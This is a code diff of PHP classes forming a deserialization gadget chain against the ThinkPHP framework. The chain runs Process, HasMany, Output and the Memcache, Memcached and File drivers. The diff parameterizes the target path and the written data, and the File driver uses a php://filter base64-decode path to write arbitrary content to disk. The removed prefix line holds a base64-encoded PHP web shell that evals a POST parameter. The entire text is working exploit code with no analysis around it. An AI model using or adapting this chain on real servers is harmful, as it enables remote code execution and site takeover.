@@ -11,10 +11,10 @@ class Process
     private $status;
 
     private $processInformation;
-    public function  __construct(){
+    public function  __construct($path,$data){
         $this->processInformation['running']=true;
         $this->status=3;
-        $this->processPipes=new HasMany();
+        $this->processPipes=new HasMany($path,$data);
     }
 
 }
@@ -45,10 +45,11 @@ class HasMany extends Relation
     //protected $baseQuery=true;
     protected $parent;
     protected $localKey='a';
-    protected $foreignKey='a';
     protected $pivot;
-    public function __construct(){
-        $this->query=new Output();
+    protected $foreignKey;
+    public function __construct($path,$data){
+        $this->foreignKey='AAA'.$data;
+        $this->query=new Output($path,$data);
         $this->parent= new Merge();
 
     }
@@ -75,18 +76,18 @@ class Output{
         'where'
     ];
     private $handle;
-    public function __construct()
+    public function __construct($path,$data)
     {
-        $this->handle = (new \think\session\driver\Memcache);
+        $this->handle = (new \think\session\driver\Memcache($path,$data));
     }
 }
 namespace think\session\driver;
 class Memcache
 {
     protected $handler;
-    public function __construct()
+    public function __construct($path,$data)
     {
-        $this->handler = (new \think\cache\driver\Memcached);
+        $this->handler = (new \think\cache\driver\Memcached($path,$data));
     }
 }
 
@@ -99,14 +100,14 @@ class Memcached
     protected $options;
     protected $handler;
 
-    public function __construct()
+    public function __construct($path)
     {
         $this->tag = true;
         $this->options = [
             'expire'   => 0,
-            'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
+            'prefix'   => '',
         ];
-        $this->handler = (new File);
+        $this->handler = (new File($path));
     }
 }
 
@@ -114,7 +115,7 @@ class File
 {
     protected $tag;
     protected $options;
-    public function __construct()
+    public function __construct($path)
     {
         $this->tag = false;
         $this->options = [
@@ -122,7 +123,7 @@ class File
             'cache_subdir'  => false,
             'prefix'        => '',
             'data_compress' => false,
-            'path'          => 'php://filter/convert.base64-decode/resource=./',
+            'path'          => 'php://filter/convert.base64-decode/resource='.$path,
         ];
     }
 }
